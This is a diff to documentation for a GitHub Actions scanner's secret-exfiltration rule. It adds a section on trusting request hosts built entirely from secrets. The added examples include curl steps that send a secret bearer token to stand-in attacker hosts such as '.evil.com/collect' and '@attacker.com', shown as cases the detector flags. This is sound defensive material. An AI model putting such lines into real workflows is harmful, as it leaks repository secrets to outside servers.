@@ -214,6 +214,44 @@ Per-workflow entries are additive; they never remove global ones. Per-workflow e
 
 Applies only to `secret-exfiltration`; `secret-in-log` is unaffected.
 
+### Secret-administered destinations
+
+A destination whose **entire host** is derived from a secret value is treated
+as administrator-controlled and therefore trusted. Only repository
+administrators can set or change secret values, so sending a secret-bearing
+request to `${{ secrets.MY_API_URL }}` (or an env var bound to it) is the
+intended API/webhook authentication flow, not exfiltration to an
+attacker-controlled server.
+
+```yaml
+# GOOD: API key header sent to an admin-configured API URL (both from secrets)
+- env:
+    MY_API_URL: ${{ secrets.MY_API_URL }}
+    MY_API_KEY: ${{ secrets.MY_API_KEY }}
+  run: |
+    curl -X POST "$MY_API_URL/api/v1/sync" \
+      -H "X-Admin-API-Key: $MY_API_KEY"
+
+# GOOD: inline secret destination
+- run: |
+    curl -X POST "${{ secrets.API_URL }}/api/v1/sync" \
+      -H "Authorization: Bearer ${{ secrets.API_TOKEN }}"
+```
+
+The trust decision is conservative: the host must be made up *entirely* of
+secret-sourced variables. Any other component keeps the finding:
+
+```yaml
+# BAD: literal attacker suffix appended to a secret-derived host
+- run: curl -H "Authorization: Bearer ${{ secrets.TOKEN }}" "${{ secrets.API_URL }}.evil.com/collect"
+
+# BAD: @userinfo redirect to an attacker host
+- run: curl -H "Authorization: Bearer ${{ secrets.TOKEN }}" "${{ secrets.API_URL }}@attacker.com"
+
+# BAD: unresolvable non-secret destination
+- run: curl -H "Authorization: Bearer ${{ secrets.TOKEN }}" "$UNKNOWN_HOST/collect"
+```
+
 ## Why This Rule Matters
 
 1. **Data Theft**: Attackers with write access to workflows can add steps that exfiltrate secrets to their servers
